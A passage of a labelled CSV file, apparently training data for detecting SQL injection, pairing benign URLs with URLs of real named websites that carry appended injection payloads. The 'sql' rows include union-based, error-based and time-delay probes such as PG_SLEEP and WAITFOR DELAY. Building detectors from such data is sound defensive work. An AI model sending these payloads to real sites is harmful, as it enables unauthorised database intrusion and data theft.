,language,source"
293,sql,"http : / / corp . toei - anim . co . jp / en / film / pickup . php ? id = 1 ' ORDER BY 6555 - - CoTc"
295,sql,"http : / / www . iias - trieste - maribor . eu / index . php ? id = 1 AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) - - NonP"
296,sql,"http : / / www . m - e - l . fr / fiche - education - artistique . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - IKMj"
297,sql,"http : / / www . rancinan . com / official / photos . php ? id = 1 % ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' % ' = ' "
299,sql,"http : / / www . mherc . mb . ca / page . php ? id = 1 ' ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' DVsm ' = ' DVsm"
300,sql,"http : / / molvica . org / vesti_content . php ? id = 1 ' ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( ' mQhu ' = ' mQhu"
301,sql,"http : / / www . dreamville - bg . com / ru / complex . php ? id = 1 UNION ALL SELECT NULL , NULL - - ctvb"
302,sql,"http : / / www . thespastudios . com / p . php ? id = 1 ) AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( 6121 = 6121"
303,sql,"https : / / www . i - cpan . es / detallePregunta . php ? id = 1 ' ) ORDER BY 1 - - tslS"
304,sql,"http : / / www . tomkane . com / section . php ? id = 1 ) ORDER BY 1 - - zRhc"
305,sql,"http : / / www . belmos . ru / transp - artcl . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL - - TLHU"
306,sql,"https : / / 74 . ru / forum / view . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) "
307,sql,"http : / / www . lecoshop . ru / dir . php ? id = 1 ' ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY"
308,sql,"http : / / www . jevicko . cz / index . php ? id = 1 ' ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY"
309,sql,"http : / / www . vlktravel . com / tour . php ? id = 1 ) AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ( 1264 = 1264"
310,sql,"http : / / www . anm - conso . com / prof - 03 . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - bDCI"
311,sql,"https : / / www . filter . ru / index . php ? id = 1 ' ;SELECT PG_SLEEP ( 5 ) - - "
312,sql,"http : / / ohiofoodbanks . org / programs / programs . php ? id = 6787"
314,sql,"http : / / 2017 . tiff - jp . net / ja / lineup / works . php ? id = 1 ' ORDER BY 1 - - Hgvf"
315,sql,"http : / / www . sriaurobindoashram . org / music / sunil / index . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - wXih"
316,sql,"http : / / eurofo . ru / m / viewforum . php ? id = 1 ) AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ( 1264 = 1264"
318,sql,"http : / / animatch . ca / machform / view . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL - - utDw"
319,sql,"http : / / www . sydneyshoot . com / buy . php ? id = 1 ) ORDER BY 1 - - zRhc"
320,sql,"http : / / www . theartofdicktwinney . com / statment . php ? id = 1 WAITFOR DELAY ' 0 : 0 : 5 ' "
321,sql,"https : / / place . fi . ncsu . edu / local / catalog / section . php ? id = 1 ) ORDER BY 1 - - zRhc"
322,sql,"http : / / www2 . ntnu . edu . tw / modules / tinyd0 / index . php ? id = 1 AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) - - Qmvu"
323,sql,"http : / / www . hits . pt / gca / index . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL - - Lunn"
324,sql,"http : / / www . warbears . com / missions . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - ApsM"
325,sql,"https : / / www . hcilondon . in / pages . php ? id = 5845"
326,sql,"http : / / www . firstreception . gov . gr / content . php ? id = 1 ' WAITFOR DELAY ' 0 : 0 : 5 ' AND ' cIcm ' = ' cIcm"
327,sql,"http : / / www . opera - amsterdam . nl / pages . php ? id = 1 % ' ORDER BY 7815 - - mzUV"
331,sql,"http : / / www . ubraintv . com / watchchannel . php ? id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - WYnw"
332,sql,"https : / / www . skau . sk / page . php ? id = 1 ) AND 4249 = ( SELECT UPPER ( XMLType ( CHR ( 60 ) | | CHR ( 58 ) | | CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) | | ( SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) | | CHR ( 62 ) ) ) FROM DUAL ) AND ( 9475 = 9475"
333,sql,"https : / / www . tukui . org / addons . php ? id = 1 ) AND 6592 = ( SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( 2513 = 2513"
334,sql,"http : / / www . semsk . kz / newscat . php ? id = 1 ' ) ORDER BY 1 - - tslS"
335,sql,"http : / / www . msosocal . com / subpages / leadership_bio . php ? id = 1 ' AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) AND ' VCNg ' = ' VCNg"
336,sql,"http : / / pravo . ua / events . php ? id = 1 ' AND ( SELECT 9697 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 9697 = 9697 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' JKvn ' = ' JKvn"
337,sql,"http : / / www . rainbow . com . my / support . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - sBcc"
338,sql,"https : / / www . softube . com / index . php ? id = 1 ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL - - Dvxx"
339,sql,"http : / / www . chicken . org . au / page . php ? id = 1 ' ) AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) AND ( ' eWKx ' = ' eWKx"
341,sql,"http : / / www . oardc . ohio - state . edu / weedguide / single_weed . php ? id = 1 ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - - spUE"
343,sql,"http : / / bagfa . de / index . php ? id = 1 AND 7622 = CAST ( ( CHR ( 113 ) | | CHR ( 118 ) | | CHR ( 106 ) | | CHR ( 98 ) | | CHR ( 113 ) ) | | ( SELECT ( CASE WHEN ( 7622 = 7622 ) THEN 1 ELSE 0 END ) ) : : text | | ( CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 113 ) | | CHR ( 120 ) | | CHR ( 113 ) ) AS NUMERIC ) "
344,sql,"https : / / likumi . lv / doc . php ? id = ( SELECT 8610 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 8610 = 8610 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) "
345,sql,"https : / / earthobservatory . nasa . gov / IOTD / view . php ? id = 1 ) ORDER BY 4287 - - vRlT"
350,sql,"https : / / www . otzyv . ru / read . php ? id = 1 ' ) ;WAITFOR DELAY ' 0 : 0 : 5 ' - - "
358,sql,"http : / / dailyjinnah . com / epaper / page . php ? id = 1 ) WAITFOR DELAY ' 0 : 0 : 5 ' AND ( 5754 = 5754"
359,sql,"http : / / dailyjinnah . com / epaper / page . php ? id = ( SELECT CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 5838 = 5838 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) "
360,sql,"http : / / dailyjinnah . com / epaper / page . php ? id = 1 UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL - - gXRN"
367,sql,"https : / / antizapret . info / org . php ? id = 1 ORDER BY 1 - - lAea"
368,normal,"http : / / www . romanianwriters . ro / s . php ? id = 1"
369,normal,"http : / / www . bible - history . com / subcat . php ? id = 1"
370,normal,"http : / / ruscongrmech2015 . ru / index . php ? id = 1"
371,normal,"http : / / berkeleyrecycling . org / page . php ? id = 1"
372,normal,"http : / / www . xrayrisk . com / calculator / calculator - normal - studies . php ? id = 1"
373,normal,"http : / / 193 . 232 . 218 . 56 / web - local / prep / rj / index . php ? id = 1"
375,normal,"https : / / www . fleurlis . com . tw / en / wedding . php ? id = 1"
376,normal,"http : / / www . dipintoguitars . com / category . php ? id = 1"
377,normal,"http : / / www . teamgear . us / store . php ? id = 1"
378,normal,"http : / / www . multan . gov . pk / files . php ? id = 1"
379,normal,"http : / / www . asfaa . org / members . php ? id = 1"
380,normal,"http : / / www . bpc . gov . bd / contactus . php ? id = 1"
381,normal,"https : / / metacarpolis . com / index . php ? id = 1"
382,normal,"http : / / www . jbctools . com / cataleg . php ? id = 1"
384,normal,"http : / / ansobor . ru / page . php ? id = 1"
385,normal,"http : / / www . khrunichev . ru / main . php ? id = 1"
386,normal,"http : / / www . studentvote . ca / 2011 / results / index . php ? id = 1"
387,normal,"https : / / www . orthphoto . net / user . php ? id = 1"
388,normal,"http : / / esjindex . org / search . php ? id = 1"
389,normal,"http : / / www . sansihotels . com / hotels . php ? id = 1"
390,normal,"http : / / www . adopfrance . fr / gb / galerie / index . php ? id = 1"
391,normal,"http : / / www . akko . org . il / map_en . php ? id = 1"
392,normal,"http : / / www . paranatural . net / index . php ? id = 1"
393,normal,"http : / / www . photobiology . org / asp . php ? id = 1"
396,normal,"http : / / www . stateofdesign . berlin / subevents . php ? id = 1"
397,normal,"https : / / www . acme . in / contentpage . php ? id = 1"
398,normal,"http : / / www . komiaviatrans . ru / airport / index . php ? id = 1"
399,normal,"http : / / www . cdep . ru / index . php ? id = 60 % 26step = 1"
400,normal,"http : / / www . peml . com / login . php ? rtn_url = http : / / www . peml . com / category . php ? id = 1"
401,normal,"http : / / www . palfi . net / partners . php ? id = 1"
402,normal,"http : / / www . sabella . fr / fiche . php ? id = 1"
403,normal,"http : / / electronautomotive . com / order . php ? id = 1"
404,normal,"http : / / en . firenze - online . com / shops / florence - shop . php ? id = 1"
405,normal,"http : / / www . pidsphil . org / journal_info . php ? id = 1"
406,normal,"http : / / www . egscomics . com / index . php ? id = 1"
407,normal,"https : / / 100wonders . ru / index . php ? id = 1"
408,normal,"http : / / www . ifsb . org / membership . php ? id = 1"
409,normal,"https : / / www . ocsalumni . org / events / cart . php ? id = 1"
410,normal,"http : / / www . ssy . org / detail . php ? id = 1"
411,normal,"http : / / www . micwaudio . com / product . php ? id = 1"
412,normal,"http : / / www . smart - ground . eu / partner . php ? id = 1"
413,normal,"http : / / www . lambbuilding . co . uk / members / profile . php ? id = 1"
414,normal,"http : / / www . minutesemeiotic . org / home . php ? id = 1"
415,normal,"http : / / pedlib . ru / katalogy / katalog . php ? id = 1"
416,normal,"http : / / bestindustrygroup . com / news . php ? id = 1"
417,normal,"http : / / cityvis . io / detail . php ? id = 1"
418,normal,"http : / / www . fairtradegroupnepal . org / about . php ? id = 1"
419,normal,"http : / / www . cacert . org / index . php ? id = 1"
420,normal,"http : / / koshi . fr / achat / produit_details . php ? id = 1"
421,normal,"http : / / vlab . co . in / ba_labs_all . php ? id = 1"
422,normal,"http : / / ewfed . com / cat . php ? id = 1"
423,normal,"https : / / www . kunstreservebank . nl / index . php ? id = 1 % 26lang = EN"
424,normal,"http : / / www . cqfa . ca / public / index . php ? id = 1"
425,normal,"https : / / www . free - country - flags . com / flag_pack . php ? id = 1"
426,normal,"http : / / www . carrot - home . com / project . php ? id = 1"
427,normal,"https : / / www . partnerschulnetz . de / index . php ? id = 562 % 26L = 1"
428,normal,"https : / / www . albinagroup . com / products . php ? id = 1"
429,normal,"http : / / modniditky . com / katalog . php ? id = 1"
430,normal,"http : / / www . evanscartoons . com / gallery . php ? id = 1"
431,normal,"http : / / paritarian - funds - construction . eu / page . php ? id = 1"
432,normal,"https : / / www . jannah . ae / hotels . php ? id = 1"
433,normal,"http : / / www . nm . cz / publikace / publikace - detail - en . php ? id = 1"
434,normal,"http : / / xn - - 149 - 5cd9ame0ai0a4e5b . xn - - p1ai / page . php ? id = 1"
435,normal,"http : / / www . daiichisankyo . co . th / aboutus . php ? id = 1"
436,normal,"http : / / www . epomm . eu / maxeva / index . php ? id = 1"
437,normal,"http : / / www . skystartravels . com / gallery . php ? id = 1"
439,normal,"http : / / www . sakhalinprokur . ru / contacts . php ? id = 1"
440,normal,"http : / / dance . vftsarr . ru / index . php ? id = 1"
441,normal,"http : / / gtrkchita . ru / listen . php ? id = 1"
442,normal,"https : / / learnzone . org . uk / courses / course . php ? id = 1"
443,normal,"http : / / www . jannahplace . com / hotels . php ? id = 1"
444,normal,"http : / / www . rgcms . edu . in / research . php ? id = 1"
445,normal,"http : / / www . nordicbook . ru / index . php ? id = 1"
446,normal,"https : / / vstomp . hotoneaudio . com / ProductsDetail . php ? id = 1"
448,normal,"http : / / www . strail . de / index . php ? id = 1274 % 26L = 1"
449,normal,"http : / / www . ohmsghana . com / pages / services . php ? id = 1"
450,normal,"http : / / www . kvm . co . ke / products . php ? id = 1"
451,normal,"http : / / www . professor - butakov . ru / history / view_history . php ? id = 1"
452,normal,"http : / / www . indembassy . be / pages . php ? id = 1"
453,normal,"http : / / www . smtmax . com / category . php ? id = 15"
454,normal,"http : / / www . mirraketok . ru / subs . php ? id = 1"
455,normal,"http : / / www . arion . ru / template . php ? id = 1"
456,normal,"http : / / www . myappterms . com / reader . php ? id = 1"
457,normal,"http : / / www . ictet . org / list % 2Bmember . php ? id = 1"
459,normal,"http : / / www . unifr . ch / form / iaupe_32 / view . php ? id = 1"
460,normal,"http : / / www . millennium - tech . net / serviceInfo . php ? id = 1"
461,normal,"http : / / www . jdcaravan . com / store . php ? id = 1"
462,normal,"https : / / www . nationaloil . co . ke / site / 2 . php ? id = 1"
463,normal,"https : / / www . crocodile . com . hk / en / webpage . php ? id = 1 % 26tp = 1"
464,normal,"http : / / www . icona . info / content . php ? id = 1"
465,normal,"http : / / www1 . clermont . inra . fr / wq / index . php ? id = simul % 26new = 1"
466,normal,"http : / / www . shorttrackonline . info / web - tv . php ? id = 1"
468,normal,"http : / / safring . adu . org . za / content . php ? id = 1"
469,normal,"http : / / www . phpsimplicity . com / tips . php ? id = 1"
471,normal,"https : / / ticketpay . jp / support_page . php ? id = 1"
472,normal,"https : / / www . aaaauto . eu / en / users . php ? id = 1"
473,normal,"http : / / www . mvpvo . ru / inner . php ? id = 1"
475,normal,"https : / / www . law . cuhk . edu . hk / en / people / info . php ? id = 1"
477,normal,"https : / / www . cmu . ac . th / en / engaboutcmu . php ? id = 1"
478,normal,"https : / / www . indianembassythimphu . bt / pages . php ? id = 1"
481,normal,"https : / / www . tonfly . com / helmet . php ? id = 1"
482,normal,"http : / / www . polosub . com / scheda_mute_en . php ? id = 1"
483,normal,"https : / / xn - - 80aaejurlecbd2k8c . xn - - p1ai / index . php ? id = 1"
484,normal,"http : / / www . sinohytec . com / en / page . php ? id = 1"
485,normal,"https : / / friendsofscience . org / index . php ? id = 1"
486,normal,"http : / / www . blessgans . de / index . php ? id = 45 % 26L = 1"
487,normal,"http : / / www . zentrumexil . at / index . php ? id = 1"
488,normal,"https : / / www . laboshop . com / index . php ? id = 5 % 26L = 1"
489,normal,"http : / / www . stalmax . com / index . php ? id = 1"
490,normal,"https : / / rational . org / index . php ? id = 1"
491,normal,"https : / / library . geraldika . ru / book . php ? id = 1"
492,normal,"http : / / www . redtory . com . cn / english / about . php ? id = 1"
493,normal,"http : / / www . innofader . com / products . php ? id = 1"
494,normal,"http : / / www . freescience . info / books . php ? id = 1"
495,normal,"http : / / www . treeviewthai . com / service_en . php ? id = 1"
496,normal,"http : / / www . ghanatimber . org / certification_details . php ? id = 12"
498,normal,"http : / / venusita - moda . com / article . php ? id = 1"
499,normal,"http : / / byglearning . co . uk / mrcrsc - lms / course / category . php ? id = 1"
500,normal,"http : / / www . mcdonalds . co . jp / quality / allergy_Nutrition / nutrient2 . php ? id = 1"
501,normal,"http : / / www . energyquest . com . au / reports . php ? id = 1"
502,normal,"http : / / www . rideitmoto . com / products_list1 . php ? id = 1"
504,normal,"http : / / www . tdap . gov . pk / trade - bodies . php ? id = 1"
505,normal,"https : / / www . ileswastesystems . co . uk / index . php ? id = 1"
507,normal,"https : / / mahara . org / group / view . php ? id = 1"
508,normal,"http : / / www . palavrion . com / index . php ? id = 1"
510,normal,"https : / / www . indianembassy . de / pages . php ? id = 1"
511,normal,"https : / / www . dt - shop . com / index . php ? id = 3 % 26L = 1"
512,normal,"http : / / www . gulf1bank . com / page . php ? id = 11"
513,normal,"http : / / www . nsb . gov . bt / publication / publications . php ? id = 1"
514,normal,"http : / / www . cubana . ru / about . php ? id = 1"
515,normal,"http : / / nursing . flinders . edu . au / students / studyaids / drugcalculations / page . php ? id = 1"
516,normal,"http : / / outbacklabs . com / listing . php ? id = 1"
517,normal,"http : / / www . viparspectra . com / category . php ? id = 1"
518,normal,"http : / / silverstateenergy . org / announcement . php ? id = 1"
519,normal,"https : / / edlinked . soe . waikato . ac . nz / research / journal / index . php ? id = 1"
520,normal,"http : / / www . ausmip . org / main . php ? id = 1"
521,normal,"http : / / www . realisticky . cz / ucebnice . php ? id = 1"
522,normal,"http : / / www . pyme . go . cr / cuadro1 . php ? id = 1"
523,normal,"http : / / www . hrpub . org / journals / jour_info . php ? id = 1"
524,normal,"http : / / www . ipicshopping . co . za / shopping_centre . php ? id = 1"
525,normal,"http : / / biblia . deon . pl / rozdzial . php ? id = 1"
527,normal,"http : / / www . vaughanchinese . com / new / websites / content . php ? id = 1"
528,normal,"http : / / alphaonenow . org / info . php ? id = 131"
529,normal,"https : / / polenow . com / login . php ? id = 1 % 26lang = EN"
531,normal,"http : / / www . justiceforsergei . com / video . php ? id = 1"
532,normal,"http : / / www . mujahidkamran . com / books . php ? id = 1"
533,normal,"https : / / www . anglesgallery . com / ssp_director / artistgallery . php ? id = 11"
534,normal,"http : / / identitiesjournal . edu . mk / cat . php ? id = 1"
535,normal,"http : / / www . microfinance . lk / member_profile . php ? id = 1"
536,normal,"http : / / www . aphesa . com / downloads / download2 . php ? id = 1"
537,normal,"http : / / www . microatena . it / biblioteca . php ? id = 1"
538,normal,"https : / / www . safari - hotels . com / site / 3 . php ? id = 1"
539,normal,"http : / / dancingbetty . com / product - list . php ? id = 1"
540,normal,"http : / / www . terraclean . net / product . php ? id = 1"
541,normal,"http : / / www . gainwelltravel . com / cms . php ? id = 1"
542,normal,"http : / / www . morini . ch / product_det . php ? id = 1"
543,normal,"http : / / www . renexpo - bih . com / index . php ? id = 7 % 26L = 1"
545,normal,"https : / / learning . thefa . com / totara / program / view . php ? id = 177"
546,normal,"http : / / www . austinminiatures . com / products . php ? id = 1"
547,normal,"http : / / kpd1 . ru / catalog . php ? id = 1"
548,normal,"http : / / www . habibitours . com / cat . php ? id = 1"
549,normal,"http : / / www . daesgroup . com / region . php ? id = 1"
550,normal,"http : / / www . ventrilo . com / dlprod . php ? id = 1"
551,normal,"http : / / www . system16 . com / museum . php ? id = 1"
552,normal,"http : / / www . stabilizationandtransition . org / Bio . php ? id = 1"
553,normal,"http : / / www . turbaza - volgograd . ru / viewbase . php ? id = 1"
554,normal,"http : / / www . sunxtender . com / solarbattery . php ? id = 1"
555,normal,"http : / / www . cmt - net . org / index . php ? id = 1 % 26L = 1"
556,normal,"http : / / www . cultuurwijzerapeldoorn . nl / cultuurmenu . php ? id = 1"
557,normal,"http : / / www . indiainfrastructure . com / shopping_cart . php ? id = 1"
558,normal,"https : / / www . kianjoocan . com . my / index . php ? id = 1"
561,normal,"http : / / ska3 . ru / bummi . php ? id = 1"
562,normal,"http : / / www . caosciotocounty . org / template . php ? id = 1"
564,normal,"http : / / www . askewsfoods . com / stores . php ? id = 1"
565,normal,"http : / / www . firstinmichigan . org / stream . php ? id = 1"
566,normal,"http : / / boywhofell . com / index . php ? id = 1"
567,normal,"https : / / www . arabculturefund . org / projects / project . php ? id = 1"
568,normal,"https : / / www . zobodat . at / publikation_series . php ? id = 1"
569,normal,"http : / / stfranciscountyar . org / page . php ? id = 1"
570,normal,"http : / / www . harvestlink . com / productsDia . php ? id = 52"
571,normal,"http : / / www . indiannumismatics . com / products . php ? id = 1"
572,normal,"http : / / www . integral - eu . com / index . php ? id = 1"
573,normal,"http : / / www . howtostudy . org / resources_skill . php ? id = 1"
574,normal,"http : / / www . prazskamuzejninoc . cz / 2017 / clanek . php ? id = 1"
576,normal,"http : / / netintel . ru / index . php ? id = 41"
577,normal,"http : / / www . shortrifles . com / configuration . php ? id = 1"
579,normal,"http : / / www . atmarine . fi / index . php ? id = 2"
580,normal,"http : / / www . marsfigures . com / main . php ? id = 9"
581,normal,"http : / / www . rysslandsresor . se / index . php ? id = 1"
582,normal,"https : / / www . ecabank . com / home / index . php ? id = 95"
583,normal,"http : / / bram . smartelectronix . com / plugins . php ? id = 1"
584,normal,"http : / / www . gardenfarmgolf . com / en_locations . php ? id = 1"
585,normal,"http : / / orgia . ru / about . php ? id = 1"
586,normal,"http : / / www . goafilms . com / location . php ? id = 1"
587,normal,"http : / / learnonline . health . nz / course / category . php ? id = 1"
588,normal,"http : / / www . stasy . gr / index . php ? id = 1 % 26no_cache = 1 % 26L = 1"
589,normal,"https : / / malffb . gov . vu / index . php ? id = 1"
590,normal,"http : / / njsfwc . org / projects . php ? id = 21"
591,normal,"http : / / www . krao . ru / cd - item . php ? id = 1"
592,normal,"http : / / www . ulagos . cl / contenido03 . php ? id = 1"
593,normal,"https : / / wciom . ru / index . php ? id = 236 % 26uid = 115707"
594,normal,"http : / / www . icehalo . ca / products . php ? id = 1"
595,normal,"http : / / www . vittoria - shoes . com / prodotto . php ? id = 1"
596,normal,"http : / / mkogan . com / duty . php ? id = 1"
597,normal,"https : / / koreamed . org / JournalVolume . php ? id = 158"
598,normal,"http : / / www . skytraktravel . com / services . php ? id = 174"
599,normal,"http : / / www . uba . ar / academicos / uba21 / contenidos . php ? id = 1"
600,normal,"http : / / www . isconshanghai . org / web / page . php ? id = 41"
601,normal,"https : / / www . id . ee / index . php ? id = 31015"
603,normal,"http : / / pastelspace . com / collection . php ? id = 1"
604,normal,"https : / / www . sjs . org . hk / en / services / services . php ? id = 1"
605,normal,"http : / / maximaaa . com / mform / view . php ? id = 1"
606,normal,"http : / / www . echmb . com / about_details . php ? id = 1"
607,normal,"https : / / toxtown . nlm . nih . gov / text_version / chemicals . php ? id = 1"
608,normal,"http : / / www . med . muni . cz / index . php ? id = 1039"
609,normal,"http : / / len - zoloto . ru / index . php ? id = 1"
611,normal,"http : / / www . nordiqc . org / epitope . php ? id = 1"
612,normal,"http : / / meninositu . com . br / galeria / album . php ? id = 1"
613,normal,"https : / / www . nttgroup . co . za / proc / dealer_detail . php ? id = 1 % 26tid = 1"
614,normal,"http : / / www . hold . com . tw / product . php ? id = 1"
615,normal,"http : / / www . catsg . org / index . php ? id = 87"
616,normal,"http : / / www . theurbanrange . com / poet . php ? id = 1"
617,normal,"http : / / www . markzaid . com / biography . php ? id = 1"
618,normal,"http : / / www . markdrum . it / product_detail . php ? id = 1"
619,normal,"http : / / www . madisonpac . com / key_details . php ? id = 1"
620,normal,"http : / / pyb . co . uk / cakes - detail . php ? id = 1"
621,normal,"http : / / www . dengy - vsem . ru / prokrizis_vid . php ? id = 1"
622,normal,"http : / / one - thebrand . com / cart . php ? id = 0 % 26action = view"
623,normal,"https : / / www . studyastronomy . com / courses . php ? id = 1"
624,normal,"http : / / kyoukaigun . jp / visit / detail . php ? id = 1"
625,normal,"http : / / www . traditionalcottages . gr / page . php ? id = 1 % 26cat = 1 % 26cat2 = 0 % 26lang = 1"
626,normal,"https : / / primes . utm . edu / top20 / page . php ? id = 1"
627,normal,"http : / / www . strategictransitions . com / productDetail . php ? id = 1"
628,normal,"http : / / www . signsinthecity . net / info . php ? id = 1"
629,normal,"http : / / www . wsid . info / mod / page / view . php ? id = 1"
630,normal,"http : / / www . walpax . com . br / beachresorts . php ? id = 100"
632,normal,"http : / / www . czga . ro / pagina . php ? id = 10"
633,normal,"http : / / victorhospital . com / services . php ? id = 1"
634,normal,"http : / / www . hrvatskonumizmatickodrustvo . hr / index . php ? id = 1"
635,normal,"http : / / www . medistock . fr / en / catalogue . php ? id = 1"
636,normal,"http : / / www . tunesoman . com / product . php ? id = 200"
